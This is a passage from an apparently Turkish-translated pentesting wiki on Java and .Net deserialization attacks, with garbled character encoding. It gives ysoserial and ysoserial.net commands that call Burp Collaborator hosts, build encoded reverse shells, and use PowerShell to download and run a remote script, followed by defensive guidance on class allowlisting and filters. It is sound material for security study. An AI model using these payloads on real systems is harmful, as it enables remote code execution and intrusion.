java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
When creating a payload for **java.lang.Runtime.exec()** you **Ã¶zel karakterler** kullanamazsÄ±nÄ±z, Ã¶rneÄŸin ">" veya "|" Ã§Ä±ktÄ±yÄ± yÃ¶nlendirmek iÃ§in, "$()" komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in veya hatta **argÃ¼manlarÄ±** bir komuta **boÅŸluklarla** ayÄ±rarak geÃ§iremezsiniz ( `echo -n "hello world"` yapabilirsiniz ama `python2 -c 'print "Hello world"'` yapamazsÄ±nÄ±z). Payload'Ä± doÄŸru bir ÅŸekilde kodlamak iÃ§in [bu web sayfasÄ±nÄ±](http://www.jackson-t.ca/runtime-exec-payloads.html) kullanabilirsiniz.

**TÃ¼m olasÄ± kod yÃ¼rÃ¼tme** payload'larÄ±nÄ± Windows ve Linux iÃ§in oluÅŸturmak ve ardÄ±ndan bunlarÄ± savunmasÄ±z web sayfasÄ±nda test etmek iÃ§in aÅŸaÄŸÄ±daki scripti kullanmaktan Ã§ekinmeyin:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

You can **use** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **birlikte ysoserial ile daha fazla exploit oluÅŸturmak iÃ§in**. Bu aracÄ±n daha fazla bilgisi, aracÄ±n sunulduÄŸu **konuÅŸmanÄ±n slaytlarÄ±nda** bulunmaktadÄ±r: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)farklÄ± **Json** ve **Yml** serileÅŸtirme kÃ¼tÃ¼phanelerini Java'da istismar etmek iÃ§in yÃ¼kler oluÅŸturmak iÃ§in kullanÄ±labilir.\
Projeyi derlemek iÃ§in `pom.xml` dosyasÄ±na bu **baÄŸÄ±mlÄ±lÄ±klarÄ±** **eklemem** gerekti:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Maven'Ä± kurun** ve **projeyi derleyin**:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Bu Java JSON kÃ¼tÃ¼phanesi hakkÄ±nda daha fazla bilgi edinin: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* BazÄ± ysoserial payload'larÄ±nÄ± test etmek istiyorsanÄ±z **bu web uygulamasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabilirsiniz**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Neden

Java, Ã§eÅŸitli amaÃ§lar iÃ§in Ã§ok fazla serileÅŸtirme kullanÄ±r:

* **HTTP istekleri**: SerileÅŸtirme, parametrelerin, ViewState'in, Ã§erezlerin vb. yÃ¶netiminde yaygÄ±n olarak kullanÄ±lmaktadÄ±r.
* **RMI (Uzak YÃ¶ntem Ã‡aÄŸrÄ±sÄ±)**: Tamamen serileÅŸtirmeye dayanan Java RMI protokolÃ¼, Java uygulamalarÄ±nda uzak iletiÅŸim iÃ§in bir kÃ¶ÅŸe taÅŸÄ±dÄ±r.
* **HTTP Ã¼zerinden RMI**: Bu yÃ¶ntem, tÃ¼m nesne iletiÅŸimleri iÃ§in serileÅŸtirmeyi kullanan Java tabanlÄ± kalÄ±n istemci web uygulamalarÄ± tarafÄ±ndan yaygÄ±n olarak kullanÄ±lmaktadÄ±r.
* **JMX (Java YÃ¶netim UzantÄ±larÄ±)**: JMX, nesneleri aÄŸ Ã¼zerinden iletmek iÃ§in serileÅŸtirmeyi kullanÄ±r.
* **Ã–zel Protokoller**: Java'da, standart uygulama, ham Java nesnelerinin iletimini iÃ§erir; bu, gelecek istismar Ã¶rneklerinde gÃ¶sterilecektir.

### Ã–nleme

#### GeÃ§ici nesneler

`Serializable` arayÃ¼zÃ¼nÃ¼ uygulayan bir sÄ±nÄ±f, serileÅŸtirilemeyecek herhangi bir nesneyi sÄ±nÄ±f iÃ§inde `transient` olarak iÅŸaretleyebilir. Ã–rneÄŸin:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializable'Ä± UygulamasÄ± Gereken Bir SÄ±nÄ±fÄ±n SerileÅŸtirilmesinden KaÃ§Ä±nÄ±n

Belirli **nesnelerin sÄ±nÄ±f hiyerarÅŸisi nedeniyle `Serializable`** arayÃ¼zÃ¼nÃ¼ uygulamasÄ± gereken senaryolarda, istemeden deserialization riski vardÄ±r. Bunu Ã¶nlemek iÃ§in, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi, sÃ¼rekli bir istisna fÄ±rlatan `final` bir `readObject()` metodu tanÄ±mlayarak bu nesnelerin deserializable olmadÄ±ÄŸÄ±ndan emin olun:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java'da Deserialization GÃ¼venliÄŸini ArtÄ±rma**

**`java.io.ObjectInputStream`'i Ã–zelleÅŸtirmek**, deserialization sÃ¼reÃ§lerini gÃ¼vence altÄ±na almak iÃ§in pratik bir yaklaÅŸÄ±mdÄ±r. Bu yÃ¶ntem, aÅŸaÄŸÄ±daki durumlarda uygundur:

* Deserialization kodu kontrolÃ¼nÃ¼z altÄ±ndadÄ±r.
* Deserialization iÃ§in beklenen sÄ±nÄ±flar biliniyor.

Deserialization'Ä± yalnÄ±zca izin verilen sÄ±nÄ±flarla sÄ±nÄ±rlamak iÃ§in **`resolveClass()`** yÃ¶ntemini geÃ§ersiz kÄ±lÄ±n. Bu, yalnÄ±zca aÃ§Ä±kÃ§a izin verilen sÄ±nÄ±flarÄ±n, Ã¶rneÄŸin deserialization'Ä± yalnÄ±zca `Bicycle` sÄ±nÄ±fÄ±yla sÄ±nÄ±rlayan aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi, deserialization'Ä±nÄ± Ã¶nler:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**GÃ¼venlik GeliÅŸtirmesi iÃ§in Java AjansÄ± KullanÄ±mÄ±** kod deÄŸiÅŸikliÄŸinin mÃ¼mkÃ¼n olmadÄ±ÄŸÄ± durumlarda bir geri dÃ¶nÃ¼ÅŸ Ã§Ã¶zÃ¼mÃ¼ sunar. Bu yÃ¶ntem esasen **zararlÄ± sÄ±nÄ±flarÄ±n kara listeye alÄ±nmasÄ±** iÃ§in bir JVM parametresi kullanÄ±r:
```
-javaagent:name-of-agent.jar
```
Dinamik olarak deserialization'Ä± gÃ¼vence altÄ±na almanÄ±n bir yolunu saÄŸlar, anlÄ±k kod deÄŸiÅŸikliklerinin pratik olmadÄ±ÄŸÄ± ortamlarda idealdir.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) Ã¶rneÄŸine bakÄ±n.

**SerileÅŸtirme Filtrelerinin UygulanmasÄ±**: Java 9, serileÅŸtirilmiÅŸ nesnelerin deserialization iÅŸleminden Ã¶nce karÅŸÄ±lamasÄ± gereken kriterleri belirlemek iÃ§in gÃ¼Ã§lÃ¼ bir mekanizma saÄŸlayan **`ObjectInputFilter`** arayÃ¼zÃ¼ aracÄ±lÄ±ÄŸÄ±yla serileÅŸtirme filtrelerini tanÄ±ttÄ±. Bu filtreler, deserialization sÃ¼reci Ã¼zerinde ayrÄ±ntÄ±lÄ± kontrol sunarak kÃ¼resel veya akÄ±ÅŸ baÅŸÄ±na uygulanabilir.

SerileÅŸtirme filtrelerini kullanmak iÃ§in, tÃ¼m deserialization iÅŸlemlerine uygulanan kÃ¼resel bir filtre ayarlayabilir veya belirli akÄ±ÅŸlar iÃ§in dinamik olarak yapÄ±landÄ±rabilirsiniz. Ã–rneÄŸin:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**DÄ±ÅŸ KÃ¼tÃ¼phaneleri Kullanarak GÃ¼venliÄŸi ArtÄ±rma**: **NotSoSerial**, **jdeserialize** ve **Kryo** gibi kÃ¼tÃ¼phaneler, Java deserialization'Ä±nÄ± kontrol etme ve izleme iÃ§in geliÅŸmiÅŸ Ã¶zellikler sunar. Bu kÃ¼tÃ¼phaneler, deserialization'dan Ã¶nce serileÅŸtirilmiÅŸ nesneleri analiz etme ve Ã¶zel serileÅŸtirme stratejileri uygulama gibi ek gÃ¼venlik katmanlarÄ± saÄŸlayabilir.

* **NotSoSerial**, gÃ¼vensiz kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± Ã¶nlemek iÃ§in deserialization sÃ¼reÃ§lerini engeller.
* **jdeserialize**, serileÅŸtirilmiÅŸ Java nesnelerinin deserialization'Ä±nÄ± yapmadan analiz edilmesine olanak tanÄ±r ve potansiyel olarak zararlÄ± iÃ§eriÄŸi tanÄ±mlamaya yardÄ±mcÄ± olur.
* **Kryo**, hÄ±z ve verimliliÄŸe vurgu yapan alternatif bir serileÅŸtirme Ã§erÃ§evesidir ve gÃ¼venliÄŸi artÄ±rabilecek yapÄ±landÄ±rÄ±labilir serileÅŸtirme stratejileri sunar.

### Referanslar

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialization ve ysoserial konuÅŸmasÄ±: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Gadgetinspector hakkÄ±nda konuÅŸma: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ve slaytlar: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec belgesi: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java ve .Net JSON deserialization **belgesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuÅŸma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialization CVE'leri: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Enjeksiyonu & log4Shell

**JNDI Enjeksiyonu nedir, RMI, CORBA & LDAP aracÄ±lÄ±ÄŸÄ±yla nasÄ±l kÃ¶tÃ¼ye kullanÄ±lÄ±r ve log4shell'i nasÄ±l istismar edilir** (ve bu zafiyetin bir Ã¶rneÄŸi) aÅŸaÄŸÄ±daki sayfada bulabilirsiniz:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Mesaj Servisi

> **Java Mesaj Servisi** (**JMS**) API'si, iki veya daha fazla istemci arasÄ±nda mesaj gÃ¶ndermek iÃ§in kullanÄ±lan bir Java mesaj odaklÄ± ara yazÄ±lÄ±m API'sidir. Ãœretici-tÃ¼ketici sorununu Ã§Ã¶zmek iÃ§in bir uygulamadÄ±r. JMS, Java Platformu, Kurumsal SÃ¼rÃ¼mÃ¼ (Java EE) bir parÃ§asÄ±dÄ±r ve Sun Microsystems'te geliÅŸtirilen bir spesifikasyonla tanÄ±mlanmÄ±ÅŸtÄ±r, ancak o zamandan beri Java Topluluk SÃ¼reci tarafÄ±ndan yÃ¶nlendirilmiÅŸtir. Uygulama bileÅŸenlerinin Java EE tabanlÄ± olarak mesaj oluÅŸturmasÄ±na, gÃ¶ndermesine, almasÄ±na ve okumasÄ±na olanak tanÄ±yan bir mesajlaÅŸma standardÄ±dÄ±r. FarklÄ± bileÅŸenler arasÄ±nda iletiÅŸimi gevÅŸek bir ÅŸekilde baÄŸlanmÄ±ÅŸ, gÃ¼venilir ve asenkron hale getirir. (Kaynak: [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### ÃœrÃ¼nler

Bu ara yazÄ±lÄ±mÄ± kullanarak mesaj gÃ¶nderen birkaÃ§ Ã¼rÃ¼n bulunmaktadÄ±r:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Ä°stismar

Temelde, **tehlikeli bir ÅŸekilde JMS kullanan birÃ§ok hizmet vardÄ±r**. Bu nedenle, bu hizmetlere mesaj gÃ¶ndermek iÃ§in **yeterli ayrÄ±calÄ±klara** sahipseniz (genellikle geÃ§erli kimlik bilgilerine ihtiyacÄ±nÄ±z olacaktÄ±r), **tÃ¼ketici/abone tarafÄ±ndan deserialization yapÄ±lacak zararlÄ± nesneler serileÅŸtirebilirsiniz**.\
Bu, bu istismarda **o mesajÄ± kullanacak tÃ¼m istemcilerin enfekte olacaÄŸÄ±** anlamÄ±na gelir.

Bir hizmetin zayÄ±f olduÄŸunu hatÄ±rlamalÄ±sÄ±nÄ±z (Ã§Ã¼nkÃ¼ kullanÄ±cÄ± girdisini gÃ¼vensiz bir ÅŸekilde deserialization yapÄ±yorsa) ancak yine de zafiyeti istismar etmek iÃ§in geÃ§erli gadget'lar bulmanÄ±z gerekir.

[JMET](https://github.com/matthiaskaiser/jmet) aracÄ±, **bilinen gadget'lar kullanarak birkaÃ§ zararlÄ± nesne serileÅŸtirerek bu hizmetlere baÄŸlanmak ve saldÄ±rmak iÃ§in** oluÅŸturulmuÅŸtur. Bu istismarlar, hizmet hala zayÄ±fsa ve kullanÄ±lan gadget'lardan herhangi biri zayÄ±f uygulamanÄ±n iÃ§inde ise Ã§alÄ±ÅŸacaktÄ±r.

### Referanslar

* JMET konuÅŸmasÄ±: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slaytlar: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net baÄŸlamÄ±nda, deserialization istismarlarÄ±, bir nesnenin deserialization'Ä± sÄ±rasÄ±nda belirli kodlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in gadget'larÄ±n istismar edilmesi gibi Ã§alÄ±ÅŸÄ±r.

### Parmak Ä°zi

#### Beyaz Kutu

Kaynak kodu, aÅŸaÄŸÄ±daki durumlarÄ±n varlÄ±ÄŸÄ± iÃ§in incelenmelidir:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Odak, tÃ¼rÃ¼n kullanÄ±cÄ± kontrolÃ¼ndeki bir deÄŸiÅŸkenle belirlenmesine izin veren serileÅŸtiriciler Ã¼zerinde olmalÄ±dÄ±r.

#### Siyah Kutu

Arama, sunucu tarafÄ±nda deserialization yapÄ±labilecek **AAEAAAD/////** veya benzeri bir Base64 kodlu dizeyi hedef almalÄ±dÄ±r; bu, deserialization yapÄ±lacak tÃ¼r Ã¼zerinde kontrol saÄŸlar. Bu, `TypeObject` veya `$type` iÃ§eren **JSON** veya **XML** yapÄ±larÄ± dahil, ancak bunlarla sÄ±nÄ±rlÄ± deÄŸildir.

### ysoserial.net

Bu durumda, **deserialization istismarlarÄ±nÄ± oluÅŸturmak iÃ§in** [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) aracÄ±nÄ± kullanabilirsiniz. Git deposunu indirdikten sonra, aracÄ± **Ã¶rneÄŸin Visual Studio kullanarak derlemelisiniz**.

**ysoserial.net'in istismarÄ±nÄ± nasÄ±l oluÅŸturduÄŸunu Ã¶ÄŸrenmek** istiyorsanÄ±z, [**ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatlayÄ±cÄ±**'nÄ±n aÃ§Ä±klandÄ±ÄŸÄ± bu sayfayÄ± kontrol edebilirsiniz](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

**ysoserial.net**'in ana seÃ§enekleri: **`--gadget`**, **`--formatter`**, **`--output`** ve **`--plugin`.**

* **`--gadget`**, istismar edilecek gadget'Ä± belirtmek iÃ§in kullanÄ±lÄ±r (deserialization sÄ±rasÄ±nda komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in istismar edilecek sÄ±nÄ±f/fonksiyonu belirtin).
* **`--formatter`**, istismarÄ± serileÅŸtirmek iÃ§in kullanÄ±lacak yÃ¶ntemi belirtmek iÃ§in kullanÄ±lÄ±r (payload'Ä± deserialization yapmak iÃ§in hangi kÃ¼tÃ¼phanenin kullanÄ±ldÄ±ÄŸÄ±nÄ± bilmeniz ve aynÄ± kÃ¼tÃ¼phaneyi kullanarak serileÅŸtirmeniz gerekir).
* **`--output`**, istismarÄ± **ham** veya **base64** kodlu olarak almak isteyip istemediÄŸinizi belirtmek iÃ§in kullanÄ±lÄ±r. _Not: **ysoserial.net**, payload'Ä± **UTF-16LE** kullanarak **kodlayacaktÄ±r** (Windows'ta varsayÄ±lan olarak kullanÄ±lan kodlama), bu nedenle ham veriyi alÄ±p sadece bir linux konsolundan kodlarsanÄ±z, istismarÄ±n dÃ¼zgÃ¼n Ã§alÄ±ÅŸmasÄ±nÄ± engelleyecek bazÄ± **kodlama uyumluluÄŸu sorunlarÄ±** yaÅŸayabilirsiniz (HTB JSON kutusunda payload hem UTF-16LE hem de ASCII'de Ã§alÄ±ÅŸtÄ± ama bu her zaman Ã§alÄ±ÅŸacaÄŸÄ± anlamÄ±na gelmez)._
* **`--plugin`**, ysoserial.net, **belirli Ã§erÃ§eveler iÃ§in istismarlar oluÅŸturmak** Ã¼zere eklentileri destekler, Ã¶rneÄŸin ViewState.

#### Daha fazla ysoserial.net parametreleri

* `--minify`, **daha kÃ¼Ã§Ã¼k bir payload** saÄŸlayacaktÄ±r (mÃ¼mkÃ¼nse).
* `--raf -f Json.Net -c "anything"` Bu, saÄŸlanan bir formatlayÄ±cÄ± ile kullanÄ±labilecek tÃ¼m gadget'larÄ± gÃ¶sterecektir (`Json.Net` bu durumda).
* `--sf xml`, bir gadget'Ä± (`-g`) belirtebilir ve ysoserial.net "xml" iÃ§eren formatlayÄ±cÄ±larÄ± arayacaktÄ±r (bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±z).

**ysoserial Ã¶rnekleri** ile istismar oluÅŸturma:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ayrÄ±ca her bir exploitin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± daha iyi anlamaya yardÄ±mcÄ± olan **Ã§ok ilginÃ§ bir parametreye** sahiptir: `--test`\
Bu parametreyi belirtirseniz **ysoserial.net** **yerel olarak** **exploit** denemesi yapacaktÄ±r, bÃ¶ylece yÃ¼klemenizin doÄŸru bir ÅŸekilde Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± test edebilirsiniz.\
Bu parametre faydalÄ±dÄ±r Ã§Ã¼nkÃ¼ kodu gÃ¶zden geÃ§irirseniz aÅŸaÄŸÄ±daki gibi kod parÃ§alarÄ± bulacaksÄ±nÄ±z ( [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Bu, istismarÄ± test etmek iÃ§in kodun [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) Ã§aÄŸÄ±racaÄŸÄ± anlamÄ±na gelir.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **Ã¶nceki kod, oluÅŸturulan istismara karÅŸÄ± savunmasÄ±zdÄ±r**. Yani, bir .Net uygulamasÄ±nda benzer bir ÅŸey bulursanÄ±z, muhtemelen o uygulama da savunmasÄ±zdÄ±r.\
Bu nedenle, **`--test`** parametresi, **hangi kod parÃ§alarÄ±nÄ±n** **ysoserial.net** tarafÄ±ndan oluÅŸturulabilen deserialization istismarÄ±na karÅŸÄ± savunmasÄ±z olduÄŸunu anlamamÄ±za olanak tanÄ±r.

### ViewState

[**.Net'in \_\_ViewState parametresini istismar etmeye nasÄ±l Ã§alÄ±ÅŸÄ±lacaÄŸÄ± hakkÄ±nda bu POST'a**](exploiting-\_\_viewstate-parameter.md) bakÄ±n **rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in.** EÄŸer **kurban makinesinde kullanÄ±lan sÄ±rlarÄ± zaten biliyorsanÄ±z**, [**kod Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrenmek iÃ§in bu yazÄ±yÄ± okuyun**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Ã–nleme

.Net'te deserialization ile iliÅŸkili riskleri azaltmak iÃ§in:

* **Veri akÄ±ÅŸlarÄ±nÄ±n nesne tÃ¼rlerini tanÄ±mlamasÄ±na izin vermekten kaÃ§Ä±nÄ±n.** MÃ¼mkÃ¼nse `DataContractSerializer` veya `XmlSerializer` kullanÄ±n.
* **`JSON.Net` iÃ§in `TypeNameHandling`'i `None` olarak ayarlayÄ±n:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **`JavaScriptSerializer`'Ä± `JavaScriptTypeResolver` ile kullanmaktan kaÃ§Ä±nÄ±n.**
* **Deserialized edilebilecek tÃ¼rleri sÄ±nÄ±rlayÄ±n**, `System.IO.FileInfo` gibi .Net tÃ¼rleri ile iliÅŸkili riskleri anlayarak, bu tÃ¼rler sunucu dosyalarÄ±nÄ±n Ã¶zelliklerini deÄŸiÅŸtirebilir ve hizmet reddi saldÄ±rÄ±larÄ±na yol aÃ§abilir.
* **Riskli Ã¶zelliklere sahip tÃ¼rlerle dikkatli olun**, `Value` Ã¶zelliÄŸi ile `System.ComponentModel.DataAnnotations.ValidationException` gibi, istismar edilebilir.
* **TÃ¼r Ã¶rneklemesini gÃ¼venli bir ÅŸekilde kontrol edin**; bu, saldÄ±rganlarÄ±n deserialization sÃ¼recini etkilemesini Ã¶nler ve bu, `DataContractSerializer` veya `XmlSerializer`'Ä± bile savunmasÄ±z hale getirebilir.
* **`BinaryFormatter` ve `JSON.Net` iÃ§in Ã¶zel bir `SerializationBinder` kullanarak beyaz liste kontrolleri uygulayÄ±n.**
